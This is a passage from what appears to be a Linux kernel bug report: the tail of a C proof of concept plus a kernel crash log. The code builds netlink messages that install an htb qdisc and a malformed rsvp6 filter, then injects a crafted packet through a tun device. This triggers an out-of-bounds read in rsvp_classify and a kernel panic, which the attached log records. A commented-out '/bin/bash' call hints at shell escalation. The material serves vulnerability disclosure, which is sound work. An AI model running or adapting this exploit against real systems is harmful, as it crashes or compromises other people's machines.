	netlink_device_change(&nlmsg, sock, "hsr_slave_0", true, 0, 0, 0, NULL);
	netlink_device_change(&nlmsg, sock, "hsr_slave_1", true, 0, 0, 0, NULL);
	netlink_add_veth(&nlmsg, sock, "veth0_virt_wifi", "veth1_virt_wifi");
	netlink_add_linked(&nlmsg, sock, "virt_wifi", "virt_wifi0", "veth1_virt_wifi");
	netlink_add_veth(&nlmsg, sock, "veth0_vlan", "veth1_vlan");
	netlink_add_vlan(&nlmsg, sock, "vlan0", "veth0_vlan", 0, htons(ETH_P_8021Q));
	netlink_add_vlan(&nlmsg, sock, "vlan1", "veth0_vlan", 1, htons(ETH_P_8021AD));
	netlink_add_macvlan(&nlmsg, sock, "macvlan0", "veth1_vlan");
	netlink_add_macvlan(&nlmsg, sock, "macvlan1", "veth1_vlan");
	netlink_add_ipvlan(&nlmsg, sock, "ipvlan0", "veth0_vlan", IPVLAN_MODE_L2, 0);
	netlink_add_ipvlan(&nlmsg, sock, "ipvlan1", "veth0_vlan", IPVLAN_MODE_L3S, IPVLAN_F_VEPA);
	netlink_add_veth(&nlmsg, sock, "veth0_macvtap", "veth1_macvtap");
	netlink_add_linked(&nlmsg, sock, "macvtap", "macvtap0", "veth0_macvtap");
	netlink_add_linked(&nlmsg, sock, "macsec", "macsec0", "veth1_macvtap");
	char addr[32];
	sprintf(addr, DEV_IPV4, 14 + 10);
	struct in_addr geneve_addr4;
	if (inet_pton(AF_INET, addr, &geneve_addr4) <= 0)
	exit(1);
	struct in6_addr geneve_addr6;
	if (inet_pton(AF_INET6, "fc00::01", &geneve_addr6) <= 0)
	exit(1);
	netlink_add_geneve(&nlmsg, sock, "geneve0", 0, &geneve_addr4, 0);
	netlink_add_geneve(&nlmsg, sock, "geneve1", 1, 0, &geneve_addr6);
	netdevsim_add((int)procid, 4);
	for (i = 0; i < sizeof(devices) / (sizeof(devices[0])); i++) {
		char addr[32];
		sprintf(addr, DEV_IPV4, i + 10);
		netlink_add_addr4(&nlmsg, sock, devices[i].name, addr);
		if (!devices[i].noipv6) {
			sprintf(addr, DEV_IPV6, i + 10);
			netlink_add_addr6(&nlmsg, sock, devices[i].name, addr);
		}
		uint64_t macaddr = DEV_MAC + ((i + 10ull) << 40);
		netlink_device_change(&nlmsg, sock, devices[i].name, true, 0, &macaddr, devices[i].macsize, NULL);
	}
	close(sock);
}

static long syz_emit_ethernet(volatile long a0, volatile long a1, volatile long a2)
{
	if (tunfd < 0)
		return (uintptr_t)-1;
	uint32_t length = a0;
	char* data = (char*)a1;
	return write(tunfd, data, length);
}

static void loop();

static int do_sandbox_none(void)
{
	initialize_tun();
	initialize_netdevices();
	loop();
}

void *build_pkt(struct nlmsghdr *hdr, struct tcmsg *tcmsg, void *attrs, int attr_len)
{
	void *payload = calloc(1, 0x1000);
	void *ptr = payload;
	hdr->nlmsg_len = sizeof(struct nlmsghdr) + sizeof(struct tcmsg) + attr_len;
	// printf("nlmsg_len: %#x\n", hdr->nlmsg_len);
	// printf("attr_len: %#x\n", attr_len);

	memcpy(ptr, hdr, sizeof(struct nlmsghdr));
	ptr += sizeof(struct nlmsghdr);
	memcpy(ptr, tcmsg, sizeof(struct tcmsg));
	ptr += sizeof(struct tcmsg);
	memcpy(ptr, attrs, attr_len);
	return payload;
}

void loop(void)
{
	int nl_sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_ROUTE);

	struct nlmsghdr nlmsghdr = {
		.nlmsg_len = 0,
		.nlmsg_type = RTM_NEWQDISC, // 0x24
		.nlmsg_flags = 0xf0b,
		.nlmsg_seq = 0,
		.nlmsg_pid = 0
	};

	struct tcmsg tcmsg = {
		.tcm_family = 0,
		.tcm__pad1 = 0,
		.tcm__pad2 = 0,
		.tcm_ifindex = 1,
		.tcm_handle = 0,
		.tcm_parent = 0xffffffff,
		.tcm_info = 8
	};

	char attrs[] =	"\x08\x00""\x01\x00""htb\x00" // TCA_KIND
					"\x24\x00""\x08\x80" // TCA_STAB, stab_policy
						"\x1c\x00""\x01\x00""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00" // TCA_STAB_BASE
						"\x04\x00""\x02\x00" // TCA_STAB_DATA
					"\x1c\x00""\x02\x00" // TCA_OPTIONS
						"\x18\x00""\x02\x00""\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"; // TCA_HTB_INIT, tc_htb_glob.version=3
	void *payload = build_pkt(&nlmsghdr, &tcmsg, attrs, sizeof(attrs)-1);
	send(nl_sock, payload, nlmsghdr.nlmsg_len, 0);


	struct nlmsghdr nlmsghdr2 = {
		.nlmsg_len = 0,
		.nlmsg_type = RTM_NEWTFILTER, // 0x2c
		.nlmsg_flags = 0x0d27,
		.nlmsg_seq = 0,
		.nlmsg_pid = 0
	};

	struct tcmsg tcmsg2 = {
		.tcm_family = 0,
		.tcm__pad1 = 0,
		.tcm__pad2 = 0,
		.tcm_ifindex = 1,
		.tcm_handle = 0,
		.tcm_parent = 0,
		.tcm_info = 8
	};

	char attrs2[] = "\x0a\x00""\x01\x00""rsvp6\x00\x00\x00" // TCA_KIND
					"\x38\x00""\x02\x00" // TCA_OPTIONS
						"\x20\x00""\x04\x00""\x00\x00\x00\x00""\x87\xa5\xd7\x89""\xf1\x4e\xe7\xa0""\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00""\x00\x00\x00\x00" // TCA_RSVP_PINFO, struct tc_rsvp_pinfo
						"\x14\x00""\x02\x00""\x20\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"; // TCA_RSVP_DST, RSVP_DST_LEN * sizeof(u32), 4*sizeof(u32)
	void *payload2 = build_pkt(&nlmsghdr2, &tcmsg2, attrs2, sizeof(attrs2)-1);
	send(nl_sock, payload2, nlmsghdr2.nlmsg_len, 0);





memset((void*)0x200004c0, 170, 5);
*(uint8_t*)0x200004c5 = 0xaa;
memset((void*)0x200004c6, 170, 5);
*(uint8_t*)0x200004cb = 0xbb;
*(uint16_t*)0x200004cc = htobe16(0x800);
STORE_BY_BITMASK(uint8_t, , 0x200004ce, 6, 0, 4);
STORE_BY_BITMASK(uint8_t, , 0x200004ce, 4, 4, 4);
STORE_BY_BITMASK(uint8_t, , 0x200004cf, 0, 0, 2);
STORE_BY_BITMASK(uint8_t, , 0x200004cf, 0, 2, 6);
*(uint16_t*)0x200004d0 = htobe16(0x28);
*(uint16_t*)0x200004d2 = htobe16(0);
*(uint16_t*)0x200004d4 = htobe16(0);
*(uint8_t*)0x200004d6 = 0;
*(uint8_t*)0x200004d7 = 0x21;
*(uint16_t*)0x200004d8 = htobe16(0);
*(uint8_t*)0x200004da = 0xac;
*(uint8_t*)0x200004db = 0x14;
*(uint8_t*)0x200004dc = 0x14;
*(uint8_t*)0x200004dd = 0xbb;
*(uint32_t*)0x200004de = htobe32(0x64010104);
*(uint8_t*)0x200004e2 = 0x86;
*(uint8_t*)0x200004e3 = 2;
*(uint16_t*)0x200004e6 = htobe16(0);
*(uint16_t*)0x200004e8 = htobe16(0);
*(uint8_t*)0x200004ea = 4;
STORE_BY_BITMASK(uint8_t, , 0x200004eb, 1, 0, 4);
STORE_BY_BITMASK(uint8_t, , 0x200004eb, 0, 4, 4);
*(uint16_t*)0x200004ec = htobe16(0);
STORE_BY_BITMASK(uint8_t, , 0x200004ee, 0, 0, 1);
STORE_BY_BITMASK(uint8_t, , 0x200004ee, 0, 1, 4);
STORE_BY_BITMASK(uint8_t, , 0x200004ee, 0, 5, 3);
memcpy((void*)0x200004ef, "\x68\x10\x4f", 3);
*(uint8_t*)0x200004f2 = 0;
memcpy((void*)0x200004f3, "\x8c\x7e\xe8", 3);

	struct csum_inet csum_1;
	csum_inet_init(&csum_1);
csum_inet_update(&csum_1, (const uint8_t*)0x200004da, 4);
csum_inet_update(&csum_1, (const uint8_t*)0x200004de, 4);
	uint16_t csum_1_chunk_2 = 0x2100;
	csum_inet_update(&csum_1, (const uint8_t*)&csum_1_chunk_2, 2);
	uint16_t csum_1_chunk_3 = 0x1000;
	csum_inet_update(&csum_1, (const uint8_t*)&csum_1_chunk_3, 2);
csum_inet_update(&csum_1, (const uint8_t*)0x200004e6, 16);
*(uint16_t*)0x200004ec = csum_inet_digest(&csum_1);
	struct csum_inet csum_2;
	csum_inet_init(&csum_2);
csum_inet_update(&csum_2, (const uint8_t*)0x200004ce, 24);
*(uint16_t*)0x200004d8 = csum_inet_digest(&csum_2);
syz_emit_ethernet(/*len=*/0x36, /*packet=*/0x200004c0, /*frags=*/0);
//system("/bin/bash");



}
int main(void)
{
	syscall(__NR_mmap, /*addr=*/0x20000000ul, /*len=*/0x1000000ul, /*prot=*/7ul, /*flags=*/0x32ul, /*fd=*/-1, /*offset=*/0ul);
			do_sandbox_none();
	return 0;
}

--iA4TYvMiMBL2XF7A
Content-Type: text/plain; charset=us-ascii
Content-Disposition: attachment; filename=splash

[    5.573207] BUG: unable to handle page fault for address: ffff887fa9a6eb29
[    5.573801] #PF: supervisor read access in kernel mode
[    5.574205] #PF: error_code(0x0000) - not-present page
[    5.574632] PGD 0 P4D 0 
[    5.574849] Oops: 0000 [#1] PREEMPT SMP KASAN NOPTI
[    5.575247] CPU: 3 PID: 506 Comm: poc Not tainted 6.1.47+ #42
[    5.575720] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014
[    5.576323] RIP: 0010:rsvp_classify+0x31a/0xdf0
[    5.576703] Code: c1 e8 03 0f b6 04 10 84 c0 0f 85 ab 01 00 00 4c 63 23 4c 03 64 24 18 4c 89 e0 48 c1 e8 03 0f b6 04 10 84 c0 0f 85 b7 01 00 00 <41> 8b 2c 24 49 8d 5d 18 48 89 d8 48 c1 e8 03 0f b6 04 10 84 c0 0f
[    5.578002] RSP: 0018:ffff88800f5a72f0 EFLAGS: 00010246
[    5.578358] RAX: 0000000000000000 RBX: ffff888008b42920 RCX: ffff888008bf9c2c
[    5.578874] RDX: dffffc0000000000 RSI: 00000000ffffffe0 RDI: ffff888008b4291c
[    5.579470] RBP: 0000000000000000 R08: 0000000000000000 R09: ffff88800f5a7470
[    5.580064] R10: dfffe91001eb4e91 R11: ffffffff83b82db0 R12: ffff887fa9a6eb29
[    5.580648] R13: ffff888008b42900 R14: 0000000089d7a587 R15: 0000000001a76600
[    5.581211] FS:  00000000026fe3c0(0000) GS:ffff888034f80000(0000) knlGS:0000000000000000
[    5.581861] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    5.582359] CR2: ffff887fa9a6eb29 CR3: 000000000ce00003 CR4: 0000000000770ee0
[    5.583005] PKRU: 55555554
[    5.583259] Call Trace:
[    5.583493]  <TASK>
[    5.583689]  ? __die_body+0x67/0xb0
[    5.584020]  ? page_fault_oops+0x617/0x7b0
[    5.584375]  ? kernelmode_fixup_or_oops+0x168/0x1d0
[    5.584770]  ? exc_page_fault+0xc8/0xe0
[    5.585106]  ? asm_exc_page_fault+0x22/0x30
[    5.585418]  ? gen_tunnel+0x7a0/0x7a0
[    5.585721]  ? rsvp_classify+0x31a/0xdf0
[    5.586043]  tcf_classify+0x14f/0x350
[    5.586344]  htb_enqueue+0x24a/0xd30
[    5.586619]  dev_qdisc_enqueue+0x4a/0x150
[    5.586952]  __dev_queue_xmit+0xc52/0x2160
[    5.587315]  ip_finish_output2+0x811/0xbe0
[    5.587656]  ip_output+0x2cc/0x360
[    5.587940]  ? ip_mc_finish_output+0x3f0/0x3f0
[    5.588304]  ip_push_pending_frames+0x144/0x150
[    5.588677]  __icmp_send+0xb7b/0x11f0
[    5.588981]  ip_options_compile+0x92/0xf0
[    5.589296]  ip_rcv_finish_core+0x764/0x13a0
[    5.589653]  ip_rcv_finish+0xeb/0x190
[    5.589950]  ip_rcv+0x154/0x180
[    5.590208]  ? ip_rcv_core+0xa50/0xa50
[    5.590675]  ? ip_local_deliver_finish+0x390/0x390
[    5.591231]  __netif_receive_skb+0x384/0x4d0
[    5.591595]  netif_receive_skb+0x107/0x350
[    5.591933]  tun_rx_batched+0x513/0x750
[    5.592218]  tun_get_user+0x229e/0x3120
[    5.592553]  tun_chr_write_iter+0x144/0x1f0
[    5.592913]  vfs_write+0x796/0xa10
[    5.593200]  ksys_write+0xf8/0x1c0
[    5.593474]  do_syscall_64+0x67/0x90
[    5.593753]  ? do_user_addr_fault+0x5ed/0x7e0
[    5.594361]  ? exit_to_user_mode_prepare+0x12/0xa0
[    5.594795]  entry_SYSCALL_64_after_hwframe+0x63/0xcd
[    5.595190] RIP: 0033:0x479c37
[    5.595435] Code: ff ff f7 d8 64 89 02 48 c7 c0 ff ff ff ff eb b7 0f 1f 00 f3 0f 1e fa 64 8b 04 25 18 00 00 00 85 c0 75 10 b8 01 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 51 c3 48 83 ec 28 48 89 54 24 18 48 89 74 24
[    5.596942] RSP: 002b:00007ffcab2d42b8 EFLAGS: 00000246 ORIG_RAX: 0000000000000001
[    5.597582] RAX: ffffffffffffffda RBX: 00000000200004d8 RCX: 0000000000479c37
[    5.598172] RDX: 0000000000000036 RSI: 00000000200004c0 RDI: 00000000000000c8
[    5.598799] RBP: 00007ffcab2d42f0 R08: 0000000000000000 R09: 0000000000000000
[    5.599440] R10: 0000000000000000 R11: 0000000000000246 R12: 0000000000000001
[    5.600095] R13: 00007ffcab2d4648 R14: 0000000000501740 R15: 0000000000000002
[    5.600759]  </TASK>
[    5.600967] Modules linked in:
[    5.601263] CR2: ffff887fa9a6eb29
[    5.601559] ---[ end trace 0000000000000000 ]---
[    5.601927] RIP: 0010:rsvp_classify+0x31a/0xdf0
[    5.602290] Code: c1 e8 03 0f b6 04 10 84 c0 0f 85 ab 01 00 00 4c 63 23 4c 03 64 24 18 4c 89 e0 48 c1 e8 03 0f b6 04 10 84 c0 0f 85 b7 01 00 00 <41> 8b 2c 24 49 8d 5d 18 48 89 d8 48 c1 e8 03 0f b6 04 10 84 c0 0f
[    5.603745] RSP: 0018:ffff88800f5a72f0 EFLAGS: 00010246
[    5.604162] RAX: 0000000000000000 RBX: ffff888008b42920 RCX: ffff888008bf9c2c
[    5.604711] RDX: dffffc0000000000 RSI: 00000000ffffffe0 RDI: ffff888008b4291c
[    5.605261] RBP: 0000000000000000 R08: 0000000000000000 R09: ffff88800f5a7470
[    5.605816] R10: dfffe91001eb4e91 R11: ffffffff83b82db0 R12: ffff887fa9a6eb29
[    5.606383] R13: ffff888008b42900 R14: 0000000089d7a587 R15: 0000000001a76600
[    5.606925] FS:  00000000026fe3c0(0000) GS:ffff888034f80000(0000) knlGS:0000000000000000
[    5.607567] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[    5.608024] CR2: ffff887fa9a6eb29 CR3: 000000000ce00003 CR4: 0000000000770ee0
[    5.608592] PKRU: 55555554
[    5.608814] Kernel panic - not syncing: Fatal exception in interrupt
[    5.609554] Kernel Offset: disabled
[    5.609836] Rebooting in 1000 seconds..

--iA4TYvMiMBL2XF7A--
